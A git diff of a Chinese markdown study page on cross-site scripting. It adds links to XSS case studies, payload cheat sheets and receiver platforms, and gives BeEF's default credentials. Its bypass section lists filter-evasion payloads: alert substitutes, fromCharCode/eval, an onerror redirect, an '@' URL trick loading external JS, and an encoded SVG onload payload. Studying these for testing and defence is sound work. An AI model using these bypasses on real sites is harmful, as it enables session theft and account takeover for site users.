@@ -4,7 +4,7 @@
 
 ## 免责声明
 
-`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。`
+`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
 
 ---
 
@@ -22,12 +22,14 @@
 - [通过XSS窃取localStorage中的JWT](http://www.arkteam.net/?p=4453)
 
 **案例**
-- [BugBounty：Twitter 蠕虫 XSS](https://xz.aliyun.com/t/5050)
+- [BugBounty:Twitter 蠕虫 XSS](https://xz.aliyun.com/t/5050)
 - [T00LS帖子正文XSS](https://www.hackersb.cn/hacker/235.html)
 - [The adventures of xss vectors in curious places](https://github.com/Dliv3/Venom)
 - [Avast 杀毒软件中 5000 美元的 XSS 漏洞](https://nosec.org/home/detail/3118.html)
 - [组合拳出击-Self型XSS变废为宝](https://gh0st.cn/archives/2018-08-28/1)
 - [Reflected XSS in graph.facebook.com leads to account takeover in IE/Edge](https://ysamm.com/?p=343)
+- [XSS attacks on Googlebot allow search index manipulation](https://www.tomanthony.co.uk/blog/xss-attacks-googlebot-index-manipulation/)
+- [挖洞经验 | 看我如何发现亚马逊网站的反射型XSS漏洞](https://www.freebuf.com/articles/web/175606.html)
 
 **工具**
 - [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike) - 凑合着用吧,效果一般
@@ -54,6 +56,7 @@
 **xss 平台**
 - **开源平台**
     - [firesunCN/BlueLotus_XSSReceiver](https://github.com/firesunCN/BlueLotus_XSSReceiver)
+    - [keyus/xss](https://github.com/keyus/xss)
 
 - **在线平台**
     - http://xssye.com/index.php
@@ -62,10 +65,10 @@
 
     - 文章
         - [浏览器攻击框架 BeEF Part 1](https://www.freebuf.com/articles/web/175755.html)
-        - [浏览器攻击框架 BeEF Part 2：初始化控制](https://www.freebuf.com/articles/web/176139.html)
-        - [浏览器攻击框架 BeEF Part 3：持续控制](https://www.freebuf.com/articles/web/176550.html)
-        - [浏览器攻击框架 BeEF Part 4：绕过同源策略与浏览器代理](https://www.freebuf.com/articles/web/176873.html)
-        - [浏览器攻击框架 BeEF Part 5：Web应用及网络攻击测试](https://www.freebuf.com/articles/web/176912.html)
+        - [浏览器攻击框架 BeEF Part 2:初始化控制](https://www.freebuf.com/articles/web/176139.html)
+        - [浏览器攻击框架 BeEF Part 3:持续控制](https://www.freebuf.com/articles/web/176550.html)
+        - [浏览器攻击框架 BeEF Part 4:绕过同源策略与浏览器代理](https://www.freebuf.com/articles/web/176873.html)
+        - [浏览器攻击框架 BeEF Part 5:Web应用及网络攻击测试](https://www.freebuf.com/articles/web/176912.html)
 
         默认端口为 3000,默认路径是`/ui/authentication`,默认用户名和密码 beef
 
@@ -78,7 +81,10 @@
 - [XSS 挑战通关笔记](../../实验/XSS挑战通关笔记.md)
 
 **payload**
-    - [XSS payload](../../../../assets/file/安全/payload/XSS.md)
+- [ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
+- [masatokinugawa/filterbypass](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
+- [bugbounty-cheatsheet/cheatsheets/xss.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
+- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
 **tips**
 - **Firefox 关闭 xss 过滤器**
@@ -92,8 +98,8 @@
 ---
 
 ## 绕过方法
-1. 使用无害的 payload,类似`<b>,<i>,<u>`观察响应,判断应用程序是否被 HTML 编码,是否标签被过滤,是否过滤 `<>` 等等；
-2. 如果过滤闭合标签,尝试无闭合标签的 payload `<b,<i,<marquee` 观察响应；
+1. 使用无害的 payload,类似`<b>,<i>,<u>`观察响应,判断应用程序是否被 HTML 编码,是否标签被过滤,是否过滤 `<>` 等等;
+2. 如果过滤闭合标签,尝试无闭合标签的 payload `<b,<i,<marquee` 观察响应;
 
 
 **绕过长度限制**
@@ -121,10 +127,10 @@
 ```
 
 **替换绕过**
-过滤 alert 用 prompt，confirm，top['alert'](1) 代替绕过
+过滤 alert 用 prompt,confirm,top['alert'](1) 代替绕过
 过滤 () 用 ``代替绕过
-过滤空格 用 %0a（换行符）,%0d（回车符），/**/ 代替绕过
-小写转大写情况下 字符 ſ 大写后为 S（ſ 不等于 s）
+过滤空格 用 %0a(换行符),%0d(回车符),/**/ 代替绕过
+小写转大写情况下 字符 ſ 大写后为 S(ſ 不等于 s)
 
 **利用 eval**
 ```html
@@ -185,7 +191,7 @@ base64绕过
 
 **过滤双引号,单引号**
 ```html
-1.如果是html标签中,我们可以不用引号。如果是在js中,我们可以用反引号代替单双引号
+1.如果是html标签中,我们可以不用引号.如果是在js中,我们可以用反引号代替单双引号
 <img src="x" onerror=alert(`xss`);>
 2.使用编码绕过,具体看上面我列举的例子,我就不多赘述了
 ```
@@ -217,7 +223,7 @@ base64绕过
 
 6.使用中文逗号代替英文逗号
 如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号
-<img src="x" onerror="document.location=`http://www。baidu。com`">//会自动跳转到百度
+<img src="x" onerror="document.location=`http://www.baidu.com`">//会自动跳转到百度
 ```
 ```js
 fromCharCode方法绕过
@@ -227,7 +233,7 @@ eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))
 
 **javascript伪协议绕过**
 
-无法闭合双引号的情况下，就无法使用 onclick 等事件，只能伪协议绕过，或者调用外部 js
+无法闭合双引号的情况下,就无法使用 onclick 等事件,只能伪协议绕过,或者调用外部 js
 ```js
 换行绕过正则匹配
 onmousedown
@@ -239,10 +245,10 @@ onmousedown
 <!-- --!> 注释多行内容
 <!-- --> 注释多行内容
 <-- --> 注释多行内容
-<-- --！> 注释多行内容
+<-- --!> 注释多行内容
 --> 单行注释后面内容
 /* */ 多行注释
-有时还可以利用浏览器的容错性，不需要注释
+有时还可以利用浏览器的容错性,不需要注释
 ```
 ```js
 闭合标签空格绕过
@@ -251,16 +257,23 @@ onmousedown
 
 ```
 @ 符号绕过 url 限制
-例如：https://www.segmentfault.com@xss.haozi.me/j.js
+例如:https://www.segmentfault.com@xss.haozi.me/j.js
 其实访问的是 @ 后面的内容
 ```
 ```
 ") 逃逸函数后接分号
-例：");alert(1)//
+例:");alert(1)//
 ```
 ```
 绕过转义限制
-例：
+例:
 \")
 alert(1) //
+```
+
+**输入会被大写化**
+
+先把纯文本字符转换为HTML实体字符,然后对其进行URL编码,最后用SVG标记的onload参数输出
+```html
+<svg onload=%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x27%3B%26%23x48%3B%26%23x69%3B%26%23x20%3B%26%23x4D%3B%26%23x6F%3B%26%23x6D%3B%26%23x27%3B%26%23x29%3B>
 ```
